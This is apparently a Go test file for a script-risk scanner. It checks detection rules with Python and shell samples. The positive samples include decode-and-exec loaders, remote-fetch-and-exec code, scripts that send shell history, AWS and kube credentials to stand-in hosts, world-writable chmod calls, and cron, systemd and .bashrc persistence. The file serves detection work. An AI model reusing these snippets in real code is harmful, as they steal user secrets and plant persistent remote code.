package scriptrisk

import (
	"context"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
)

func analyze(t *testing.T, name, src string) []scanner.Finding {
	t.Helper()
	got, err := New().Analyze(context.Background(), &scanner.Target{RelPath: name, Content: []byte(src)})
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	return got
}

func hasRule(t *testing.T, name, src, id string) bool {
	t.Helper()
	for _, f := range analyze(t, name, src) {
		if f.RuleID == id {
			return true
		}
	}
	return false
}

func TestPythonDecodeExec(t *testing.T) {
	positives := []string{
		`import base64
raw = base64.b64decode(blob)
exec(raw)`,
		`import base64, zlib
def unpack():
    raw = base64.b64decode(BLOB)
    return zlib.decompress(raw)
exec(compile(unpack(), "<runtime>", "exec"), {})`,
		`from codecs import decode
payload = codecs.decode(blob, "hex")
stage = payload.decode()
exec(stage)`,
		`def run(blob):
    if blob:
        payload = base64.b64decode(blob)
        exec(payload)`,
		`payload = "".join(chr(value) for value in [112, 114, 105, 110, 116])
exec(payload)`,
		`exec("".join([chr(112), chr(114), chr(105), chr(110), chr(116)]))`,
	}
	for i, src := range positives {
		if !hasRule(t, "scripts/setup.py", src, RulePythonDecodeExec) {
			t.Errorf("positive %d did not fire", i)
		}
	}
}

func TestPythonDecodeExecFalsePositives(t *testing.T) {
	negatives := []string{
		`import base64
raw = base64.b64decode(blob)
save(raw)`,
		`exec("print('reviewed source')")`,
		`# exec(base64.b64decode(blob))
print("ok")`,
		`"""Example: exec(base64.b64decode(blob))"""
print("ok")`,
		`def decode_config():
    return base64.b64decode(DATA)
exec("print('unrelated')")`,
		`def inspect_config():
    base64.b64decode(DATA)
    return "reviewed"
exec(inspect_config())`,
		`payload = base64.b64decode(blob)
payload = "safe"
exec(payload)`,
		`def decode_only(blob):
    payload = base64.b64decode(blob)
    return payload
def execute_reviewed():
    exec(payload)`,
		`label = "".join(chr(value) for value in [65, 66, 67])
print(label)`,
		`payload = "".join(chr(value) for value in codes)
payload = "print('reviewed')"
exec(payload)`,
	}
	for i, src := range negatives {
		if hasRule(t, "scripts/setup.py", src, RulePythonDecodeExec) {
			t.Errorf("negative %d fired", i)
		}
	}
}

func TestPythonRemoteFetchExec(t *testing.T) {
	positives := []string{
		`import requests
code = requests.get("https://payload.example/stage.py").text
exec(code)`,
		`import httpx as client
response = client.get(url)
payload = response.content.decode()
exec(compile(payload, "<remote>", "exec"))`,
		`from urllib.request import urlopen as fetch
raw = fetch("https://payload.example/stage.py")
exec(raw.read())`,
		`from urllib import request as req
def run(url):
    response = req.urlopen(url)
    code = response.read().decode()
    exec(code)`,
		`import urllib.request
def load(url):
    return urllib.request.urlopen(url, timeout=5).read().decode()
def main():
    code = load("https://payload.example/stage.py")
    if code:
        exec(compile(code, "<remote>", "exec"), {})`,
	}
	for i, src := range positives {
		if !hasRule(t, "scripts/bootstrap.py", src, RulePythonRemoteExec) {
			t.Errorf("positive %d did not fire", i)
		}
	}
}

func TestPythonRemoteFetchExecFalsePositives(t *testing.T) {
	negatives := []string{
		`import requests
response = requests.get(url)
save(response.content)`,
		`import requests
response = requests.get(url)
response = SafeResponse("print('reviewed')")
exec(response.text)`,
		`import requests
exec("print('reviewed')")
response = requests.get(url)`,
		`# exec(requests.get("https://payload.example/stage.py").text)
print("ok")`,
		`"""Example: exec(requests.get("https://payload.example/stage.py").text)"""
print("ok")`,
		`class Client:
    def get(self, url):
        return SafeResponse()
client = Client()
exec(client.get(url).text)`,
		`import requests
def download(url):
    return requests.get(url).text
def execute():
    exec(payload)`,
	}
	for i, src := range negatives {
		if hasRule(t, "scripts/bootstrap.py", src, RulePythonRemoteExec) {
			t.Errorf("negative %d fired", i)
		}
	}
}

func TestPythonContextExfil(t *testing.T) {
	positives := []string{
		`import json
from pathlib import Path
from urllib.request import Request, urlopen
def collect():
    for name in [".bash_history", ".zsh_history"]:
        path = Path.home() / name
        if path.exists():
            lines = path.read_text().splitlines()
    return {"history": lines}
def send(payload):
    body = json.dumps(payload).encode()
    req = Request("https://events.example/collect", data=body, method="POST")
    urlopen(req)
send(collect())`,
		`import requests
from pathlib import Path
history = (Path.home() / ".python_history").read_text()
requests.post("https://events.example/collect", json={"history": history})`,
		`import httpx as client
from pathlib import Path
memory = (Path.home() / "MEMORY.md").read_text()
client.put("https://events.example/context", content=memory)`,
		`import urllib.request
from pathlib import Path
credentials = (Path.home() / ".aws/credentials").read_bytes()
urllib.request.urlopen("https://events.example/context", data=credentials)`,
		`from requests import patch as send
from pathlib import Path
cfg = open(Path.home() / ".kube/config").read()
send("https://events.example/context", data=cfg)`,
	}
	for i, src := range positives {
		hit := false
		for _, finding := range analyze(t, "scripts/diagnostics.py", src) {
			if finding.RuleID == RulePythonContextExfil {
				hit = true
				if !finding.Sensitive {
					t.Errorf("positive %d must carry the redaction obligation", i)
				}
				break
			}
		}
		if !hit {
			t.Errorf("positive %d did not fire", i)
		}
	}
}

func TestPythonContextExfilFalsePositives(t *testing.T) {
	negatives := []string{
		`from pathlib import Path
history = (Path.home() / ".bash_history").read_text()
print(len(history))`,
		`import requests
requests.post("https://events.example/health", json={"status": "ok"})`,
		`import requests
from pathlib import Path
config = Path(".env").read_text()
requests.post("https://api.example/deploy", data=config)`,
		`import requests
from pathlib import Path
history = (Path.home() / ".bash_history").read_text()
requests.get("https://events.example/schema")`,
		`import requests
requests.post("https://events.example/health")
history = open(".bash_history").read()`,
		`# requests.post("https://events.example/collect")
history = open(".bash_history").read()`,
		`"""Example: read ~/.bash_history and POST it with requests."""
print("diagnostics disabled")`,
		`class Client:
    def post(self, url, data=None):
        return None
from pathlib import Path
history = (Path.home() / ".bash_history").read_text()
Client().post("https://events.example/collect", data=history)`,
		`from pathlib import Path
path = Path.home() / ".bash_history"
print(path)`,
		`from urllib.request import Request, urlopen
from pathlib import Path
history = (Path.home() / ".bash_history").read_text()
req = Request("https://events.example/schema")
urlopen(req)`,
		`from pathlib import Path
path = Path.home() / ".bash_history"
path = Path("/tmp/reviewed.log")
contents = path.read_text()
import requests
requests.post("https://events.example/collect", data=contents)`,
		`from pathlib import Path
history = (Path.home() / ".bash_history").read_text()
requests.post("https://events.example/collect", data=history)
import requests`,
		`import requests
from pathlib import Path
history = (Path.home() / ".bash_history").read_text()
requests = Client()
requests.post("https://events.example/collect", data=history)`,
		`import requests
from pathlib import Path
history = (Path.home() / ".bash_history.example").read_text()
requests.post("https://events.example/collect", data=history)`,
		`import requests
from pathlib import Path
example = ".bash_history"
contents = reader.read()
requests.post("https://events.example/collect", data=contents)`,
		`from pathlib import Path
history = (Path.home() / ".bash_history").read_text()
def import_client():
    import requests as client
def send():
    client.post("https://events.example/collect", data=history)`,
	}
	for i, src := range negatives {
		if hasRule(t, "scripts/diagnostics.py", src, RulePythonContextExfil) {
			t.Errorf("negative %d fired", i)
		}
	}
}

func TestPythonWorldWritable(t *testing.T) {
	positives := []string{
		`import subprocess
subprocess.run(["chmod", "777", LOG_PATH], check=False)`,
		`import subprocess as sp
sp.Popen(["sudo", "chmod", "-R", "0777", target])`,
		`from subprocess import run as execute
execute(["/bin/chmod", "666", target])`,
		`import os
os.chmod(target, 0o777)`,
		`import os
os.chmod(target, 511)`,
		`from os import chmod as set_mode
set_mode(target, 0o666)`,
		`import os
os.system("chmod a+w /var/lib/tool/state")`,
		`import subprocess
subprocess.run("chmod o+w ./generated.log", shell=True)`,
		`import os
os.system("chmod a+rw ./generated.log")`,
		`import subprocess
subprocess.run(["chmod", "ugo+rwx", target])`,
		`import subprocess
subprocess.run(["echo", "ok"]); subprocess.run(["chmod", "777", target])`,
	}
	for i, src := range positives {
		if !hasRule(t, "scripts/setup.py", src, RulePythonWorldWrite) {
			t.Errorf("positive %d did not fire", i)
		}
	}
}

func TestPythonWorldWritableFalsePositives(t *testing.T) {
	negatives := []string{
		`import subprocess
subprocess.run(["chmod", "755", target])`,
		`import os
os.chmod(target, 0o775)`,
		`import os
os.chmod(target, 0o644)`,
		`import os
os.chmod(target, mode)`,
		`import os
os.chmod(target, 777)`,
		`import subprocess
subprocess.run(["echo", "chmod", "777", target])`,
		`subprocess.run(["chmod", "777", target])
import subprocess`,
		`import subprocess
subprocess = Client()
subprocess.run(["chmod", "777", target])`,
		`class Runner:
    def run(self, args):
        return args
Runner().run(["chmod", "777", target])`,
		`# subprocess.run(["chmod", "777", target])
print("permissions unchanged")`,
		`"""Example: subprocess.run(["chmod", "777", target])"""
print("documentation only")`,
		`import subprocess
subprocess.run("chmod 777 ./generated.log")`,
		`from os import chmod
def chmod(path, mode):
    return None
chmod(target, 0o777)`,
		`import os
os.system("echo chmod 777 ./generated.log")`,
		`import subprocess
subprocess.run(["chmod", "g+rw", target])`,
		`import subprocess
subprocess.run(["chmod", "777"])`,
		`import os
os.system("chmod 777")`,
		`import subprocess
print("subprocess.run(['chmod', '777', target])")`,
		`import subprocess
print("subprocess.run(['chmod', '777', target])"); subprocess.run(["echo", "ok"])`,
		`def import_runner():
    import subprocess as runner
def apply_mode():
    runner.run(["chmod", "777", target])`,
	}
	for i, src := range negatives {
		if hasRule(t, "scripts/setup.py", src, RulePythonWorldWrite) {
			t.Errorf("negative %d fired", i)
		}
	}
}

func TestStructuredPythonPersistence(t *testing.T) {
	src := `import subprocess
from pathlib import Path
unit_dir = Path.home() / ".config" / "systemd" / "user"
(unit_dir / "cache.service").write_text(SERVICE)
subprocess.run([
    "systemctl", "--user", "enable", "--now", "cache.service",
], check=False)
`
	if !hasRule(t, "scripts/setup.py", src, RuleSystemPersistence) {
		t.Fatal("structured systemd install did not fire")
	}
	for _, src := range []string{
		`print("systemctl --user enable cache.service")`,
		`class Runner:
    def run(self, args): pass
runner = Runner()
runner.run(["systemctl", "--user", "enable", "cache.service"])`,
		`subprocess.run(["systemctl", "--user", "status", "cache.service"])`,
		`unit_dir = Path.home() / ".config" / "systemd" / "user"
print(unit_dir / "cache.service")`,
		`# os.system("systemctl --user enable cache.service")`,
	} {
		if hasRule(t, "scripts/setup.py", src, RuleSystemPersistence) {
			t.Fatalf("benign persistence lookalike fired: %s", src)
		}
	}
}

func TestLegacyPersistenceShapesRemainCovered(t *testing.T) {
	positives := []string{
		`import os
os.system("systemctl --user enable cache.service")`,
		`from os import system
system("systemctl --user enable cache.service")`,
		`from os import popen as run_command
run_command("echo '@reboot python ~/.cache/a.py' | crontab -")`,
		`import os
os.system("echo '@reboot python ~/.cache/a.py' | crontab -")`,
		`import os
open(os.path.expanduser("~/.bashrc"), "a").write("python3 ~/.cache/a.py &")`,
	}
	for _, src := range positives {
		if !hasRule(t, "install.py", src, RuleSystemPersistence) {
			t.Fatalf("legacy persistence shape did not fire: %s", src)
		}
	}
	if hasRule(t, "install.py", `def system(command):
    return command
system("systemctl --user enable cache.service")`, RuleSystemPersistence) {
		t.Fatal("unbound local system helper fired")
	}
}

func TestUnsafePipSource(t *testing.T) {
	positives := []string{
		`pip install git+http://code.example/team/tool.git`,
		`python3 -m pip install --index-url http://203.0.113.4/simple package`,
		`pip install http://92.151.20.3/releases/helper-1.0.0-py3-none-any.whl`,
		`prepare && pip install \
  --extra-index-url=http://packages.example/simple helper`,
	}
	for _, src := range positives {
		if !hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafePipSource) {
			t.Fatalf("unsafe source did not fire: %s", src)
		}
	}
}

func TestUnsafePipSourceFalsePositives(t *testing.T) {
	negatives := []string{
		`pip install requests`,
		`pip install git+https://github.com/acme/tool.git`,
		`pip install --index-url https://packages.example/simple package`,
		`pip install --index-url http://127.0.0.1:8080/simple package`,
		`pip install --index-url http://localhost:8080/simple package`,
		`pip install --index-url http://[::1]:8080/simple package`,
		`pip install http://localhost:8080/helper.whl`,
		`pip install helper --config-settings callback=http://packages.example/report`,
		`# pip install git+http://evil.example/tool.git`,
		`echo "pip install git+http://docs.example/tool.git"`,
		`run "pip install --index-url http://packages.example/simple x"`,
	}
	for _, src := range negatives {
		if hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafePipSource) {
			t.Fatalf("benign source lookalike fired: %s", src)
		}
	}
}

func TestUnsafeNPMSource(t *testing.T) {
	positives := []string{
		`npm install http://102.30.40.5/releases/helper.tgz`,
		`npm i git+http://code.example/team/helper.git`,
		`prepare && env NODE_ENV=production npm install http://packages.example/helper.tgz`,
	}
	for _, src := range positives {
		if !hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafeNPMSource) {
			t.Fatalf("unsafe npm source did not fire: %s", src)
		}
	}

	negatives := []string{
		`npm install express`,
		`npm install http-server`,
		`npm install https://packages.example/helper.tgz`,
		`npm install git+https://github.com/acme/helper.git`,
		`npm install http://127.0.0.1:8080/helper.tgz`,
		`npm install helper --userconfig=http://packages.example/config`,
		`# npm install http://packages.example/helper.tgz`,
		`echo "npm install http://packages.example/helper.tgz"`,
		`run "npm install http://packages.example/helper.tgz"`,
	}
	for _, src := range negatives {
		if hasRule(t, "scripts/bootstrap.sh", src, RuleUnsafeNPMSource) {
			t.Fatalf("benign npm source lookalike fired: %s", src)
		}
	}
}

func TestShellPersistenceCoverage(t *testing.T) {
	positives := []string{
		`systemctl --user enable cache.service`,
		`echo '@reboot python ~/.cache/a.py' | crontab -`,
		`cat unit.service > ~/.config/systemd/user/cache.service`,
		`printf 'python3 ~/.cache/a.py &' >> ~/.bashrc`,
		`printf 'python3 ~/.cache/a.py &' | tee -a ~/.zshrc`,
	}
	for _, src := range positives {
		if !hasRule(t, "scripts/install.sh", src, RuleSystemPersistence) {
			t.Fatalf("shell persistence did not fire: %s", src)
		}
	}
	negatives := []string{
		`systemctl --user status cache.service`,
		`echo "systemctl --user enable cache.service"`,
		`# systemctl --user enable cache.service`,
		`printf 'export PATH=$PATH:/opt/tool' >> ~/.bashrc`,
		`cat unit.service > ./cache.service`,
		`echo "cat unit.service > ~/.config/systemd/user/cache.service"`,
		`echo "printf python >> ~/.bashrc"`,
		`echo '~/.bashrc' > /tmp/path.txt`,
	}
	for _, src := range negatives {
		if hasRule(t, "scripts/install.sh", src, RuleSystemPersistence) {
			t.Fatalf("shell persistence lookalike fired: %s", src)
		}
	}
}

func TestOtherFilesAreIgnored(t *testing.T) {
	if got := analyze(t, "README.md", `exec(base64.b64decode(blob))`); len(got) != 0 {
		t.Fatalf("README emitted findings: %+v", got)
	}
}
